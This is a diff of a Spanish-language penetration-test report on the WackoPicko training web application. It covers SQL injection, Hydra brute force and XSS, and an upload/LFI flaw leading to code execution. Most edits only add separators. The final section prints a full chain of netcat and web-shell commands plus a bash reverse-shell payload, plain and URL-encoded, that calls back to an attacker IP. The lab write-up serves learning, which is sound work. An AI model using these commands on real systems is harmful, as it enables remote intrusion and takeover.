@@ -134,6 +134,7 @@ conduce a un **compromiso total del sistema**. Un atacante podría escalar privi
     - Aplicar parches y actualizar dependencias.        
     - Revisar políticas de mínimos privilegios en el servidor.
 
+---
 
 ### **Objetivo 1: Identificación de Vulnerabilidades**
 
@@ -184,11 +185,13 @@ Antes de la explotación, se utilizó **Gobuster** para enumerar directorios y a
 Los resultados mostraron la existencia de archivos como `index.php`, `login.php`, y `home.php` en el directorio `/admin/`. Además, se observó que `home.php` redirige a `/admin/index.php?page=login`.
 
 
+---
 
 ## **Objetivo 2: Explotación de Vulnerabilidades**
 
 Una vez identificadas las posibles fallas, se procedió a la explotación manual de las vulnerabilidades más relevantes.
 
+---
 
 ### **Explotación de la Inyección SQL (SQLi)**
 
@@ -200,6 +203,7 @@ Se observa que aunque aparece el error de sintaxis, la verificación de la contr
 
 Los escaneos automáticos de **Vega** revelaron múltiples puntos de inyección SQL en la aplicación. Aunque el **error de sintaxis** constante sugería que un filtro de seguridad bloqueaba algunos comandos comunes, la vulnerabilidad persiste y se confirma mediante técnicas de **inyección ciega**.
 
+---
 
 #### 1. Formulario de Registro
 
@@ -212,6 +216,7 @@ El campo **`username`** en `/users/register.php` es vulnerable a inyección SQL.
 - Confirmación del hallazgo mediante escáner automático.
     
 
+---
 
 #### 2. Formulario de Inicio de Sesión
 
@@ -222,6 +227,7 @@ El campo **`username`** en `/users/login.php` también es vulnerable, lo que per
 - Acceder a cuentas de usuario sin contraseña válida.
     
 
+---
 
 #### 3. Panel de Administración
 
@@ -239,6 +245,7 @@ Ejemplo de creación de usuario con **Vega**:
 [Creacion User Vega](/assets/images/headers/vega_user.png)
 
 
+---
 
 #### 4. Ejemplo de Exploit Manual
 
@@ -262,6 +269,7 @@ Captura del login exitoso:
 
 [User Login](/assets/images/headers/userlogin.png)
 
+---
 
 #### 5. Fuerza Bruta de Usuarios
 
@@ -279,6 +287,7 @@ Captura del proceso en Burp Suite:
 Comparación de acceso al panel:  
 [scanner1 Login](/assets/images/headers/scanner1login.png)
 
+---
 
 #### 6. Enumeración de Usuarios
 
@@ -322,6 +331,7 @@ Para corregir esta vulnerabilidad y prevenir futuros ataques, se recomienda:
 
 
 
+-----
 ### **Fuerza Bruta con Hydra – Usuarios y Panel Admin**
 
 **Objetivo:**  
@@ -347,7 +357,7 @@ Se utilizó Hydra para comprobar credenciales del usuario _bryce_:
 
 La captura muestra cómo Hydra detecta intentos fallidos según el mensaje de error devuelto por la aplicación.
 
-
+---
 
 #### 2. Fuerza Bruta sobre Panel Admin `/admin/index.php?page=login`
 
@@ -380,13 +390,14 @@ La longitud del contenido siempre es **266 bytes** ante un login fallido, lo que
 
 Esta captura muestra el proceso de fuerza bruta en consola y cómo Hydra detecta logins correctos a partir de la condición de fallo definida.
 
-
+---
 
 #### 3. Resultados combinados
 - Se comprobó que los usuarios identificados previamente mediante inyección SQL (`wanda`, `scanner1`, `bryce`, `bob`) podían ser atacados mediante fuerza bruta automatizada.    
 - El panel de administración también es vulnerable a ataques por fuerza bruta debido a la ausencia de mecanismos de bloqueo y mensajes de error genéricos.
     
 
+---
 
 #### 4. Recomendaciones de seguridad frente a fuerza bruta
 
@@ -409,7 +420,7 @@ Esta captura muestra el proceso de fuerza bruta en consola y cómo Hydra detecta
 6. **Política de contraseñas robustas:**    
     - Obligar a contraseñas complejas y de longitud mínima, reduciendo la efectividad de ataques por diccionario.
 
-
+---
 
 
 ### **Explotación de Cross-Site Scripting (XSS)**
@@ -433,7 +444,7 @@ Se identificaron **otras tres vulnerabilidades XSS** adicionales en las siguient
 
 Estas vulnerabilidades podrían permitir la ejecución de scripts maliciosos en el navegador del usuario, robo de cookies o sesiones, y ataques de redirección no autorizada.
 
-
+---
 
 #### **Conclusiones y Recomendaciones Generales**
 
@@ -463,6 +474,8 @@ El análisis de **WackoPicko** reveló múltiples vulnerabilidades críticas que
     - Implementar alertas automáticas ante patrones anómalos que puedan indicar intentos de explotación.
 
 
+---
+
 
 
 
@@ -489,7 +502,7 @@ Se intentó explotar la vulnerabilidad de LFI identificada por Nikto, Burpsuite 
 
 Luego de navegar como el usuario `bob`, se identificó una vulnerabilidad de **inclusión de archivos locales (LFI)** en la función de carga de imágenes de la aplicación, permitiendo la inyección y ejecución de código malicioso.
 
-
+---
 
 ##### **1. Detección y Prueba de Concepto**
 
@@ -509,6 +522,7 @@ La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modific
 - [Cat /etc/passwd](/assets/images/headers/catetc.png)
     
 
+---
 
 ##### **2. Consecuencias**
 
@@ -519,7 +533,7 @@ La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modific
 - **Compromiso total del sistema**, incluyendo bases de datos y archivos, con posibilidad de pivotar hacia otros sistemas.
     
 
-
+---
 
 ##### **3. Exploits y Comandos Usados**
 
@@ -531,7 +545,6 @@ La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modific
 Ejemplos de comandos ejecutados:
 
 ```json
-
 sudo nc -lvnp 444 < shell.php -----------> Desde mi maquina atacante en escucha por el puerto 444
 localhost:8888/upload/hola.jpg/hola.php?cmd=nc 192.168.0.17 444 > /tmp/shell.sh -----------> desde el URL del cmd subido llamado al archivo .sh por el puerto 444
 localhost:8888/upload/hola.php/hola.php?cmd=chmod +x /tmp/shell.sh ----------->  Desde el URL del cmd subido dando permisos de ejecucion
@@ -539,13 +552,11 @@ sudo nc -lvnp 4444                                                 -----------> 
 localhost:8888/upload/hola.php/hola.php?cmd=bash /tmp/shell.sh  ----------->  Desde el URL del cmd subido ejecutar script para recibir la rev shell
 					#!/bin/bash bash -i >& /dev/tcp/192.168.0.17/4444 0>&1   ----------->  Contenido de shell.php 
 -------------------> El url que se envia luego del cmd= debe estar codificado en HEX
-
 ```
 
 Ejemplo de payloads utilizados en el url cmd como parametros:
 
 ```json
-
 bash+-c+%22bash+-i+%3E%26+/dev/tcp/192.168.0.17/4444+0%3E%261%22
 
 bash -i >& /dev/tcp/192.168.0.17/4444 0>&1
